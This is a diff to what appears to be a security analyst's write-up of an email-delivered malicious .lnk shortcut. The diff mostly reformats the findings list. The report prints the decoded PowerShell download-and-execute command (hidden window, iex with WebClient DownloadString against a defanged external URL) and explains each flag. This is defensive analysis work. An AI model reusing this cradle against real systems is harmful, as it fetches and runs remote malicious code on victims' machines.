@@ -58,17 +58,17 @@ Observed command:
 The encoded argument was decoded using CyberChef's Base64 decoder, followed by removal of the embedded null bytes. This produced the following PowerShell command:
 
 **-nop -windowstyle hidden iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')**
-Findings
+
+**Findings**
 
 The decoded payload demonstrates several suspicious behaviors:
-
--nop: Attempts to prevent PowerShell profiles from loading.
--windowstyle hidden: Executes PowerShell with the window hidden from the user.
--enc: Uses Base64 encoding to obfuscate the PowerShell command within the .lnk file.
-iex: Invokes Invoke-Expression to execute the retrieved content.
-Net.WebClient: Creates a web client used to retrieve content from a remote server.
-DownloadString(): Downloads the contents of the specified URL directly into memory.
-External URL: http://files.bpakcaging[.]xyz/update
+ - nop: Attempts to prevent PowerShell profiles from loading.
+ - windowstyle hidden: Executes PowerShell with the window hidden from the user.
+ - enc: Uses Base64 encoding to obfuscate the PowerShell command within the .lnk file.
+ - iex: Invokes Invoke-Expression to execute the retrieved content.
+ - Net.WebClient: Creates a web client used to retrieve content from a remote server.
+ - DownloadString(): Downloads the contents of the specified URL directly into memory.
+ - External URL: hxxp://files.bpakcaging[.]xyz/update
 
 The combination of an email-delivered .lnk file, hidden PowerShell execution, Base64 obfuscation, and retrieval of a remote payload is highly suspicious and indicates that the shortcut was likely intended to serve as an initial execution mechanism for additional malicious code.
 
